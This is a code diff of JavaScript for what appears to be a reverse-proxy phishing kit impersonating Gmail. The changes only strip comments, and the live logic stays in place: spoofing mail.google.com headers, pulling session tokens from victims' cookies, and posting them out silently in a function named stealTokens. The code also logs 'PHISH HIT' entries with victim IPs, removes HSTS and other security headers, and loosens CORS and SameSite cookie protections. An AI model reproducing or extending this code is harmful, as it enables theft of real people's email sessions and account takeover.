@@ -39,7 +39,6 @@ function isRateLimited(ip) {
   const key = `rate_${ip}`;
   let hits = RATE_LIMIT.get(key) || [];
   
-  // Keep only hits from last hour
   hits = hits.filter(hit => now - hit < 3600000);
   
   if (hits.length >= 100) return true;
@@ -50,7 +49,6 @@ function isRateLimited(ip) {
 }
 
 async function proxyGmail(url, request, clientIP, userAgent) {
-  // NGINX-STYLE HEADER MASKING (perfect Host/Origin spoofing)
   const headers = new Headers(request.headers);
   headers.set('Host', 'mail.google.com');
   headers.set('Origin', 'https://mail.google.com');
@@ -60,9 +58,8 @@ async function proxyGmail(url, request, clientIP, userAgent) {
   headers.set('Sec-Fetch-Dest', 'document');
   headers.set('Sec-Fetch-User', '?1');
   headers.set('Upgrade-Insecure-Requests', '1');
-  headers.delete('Accept-Encoding'); // Avoid compression issues
+  headers.delete('Accept-Encoding');
 
-  // Forward to real Gmail
   const gmailReq = new Request(`https://mail.google.com${url.pathname}${url.search}`, {
     method: request.method,
     headers,
@@ -72,9 +69,8 @@ async function proxyGmail(url, request, clientIP, userAgent) {
 
   try {
     let response = await fetch(gmailReq);
-    
-    // EXTRACT TOKENS FROM RESPONSE COOKIES
     const tokens = extractTokens(response.headers);
+    
     if (tokens.length > 0) {
       await stealTokens(tokens, clientIP, userAgent, url.href);
     }
@@ -131,7 +127,7 @@ async function stealTokens(tokens, ip, ua, url) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
-  }).catch(() => {}); // Silent fail
+  }).catch(() => {});
 
   console.log(`PHISH HIT: ${ip} | ${tokens.length} tokens | ${tokens.map(t => t.name).join(',')}`);
 }
@@ -146,12 +142,12 @@ function craftResponse(response) {
   headers.delete('Strict-Transport-Security');
   headers.delete('X-Content-Type-Options');
 
-  // CORS BYPASS (nginx add_header style)
+  // CORS BYPASS
   headers.set('Access-Control-Allow-Origin', '*');
   headers.set('Access-Control-Allow-Credentials', 'true');
   headers.set('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
 
-  // CRITICAL: COOKIE SAME-SITE FIX (bypass chrome restrictions)
+  // COOKIE SAME-SITE FIX
   const cookies = headers.getSetCookie() || [];
   headers.delete('Set-Cookie');
   
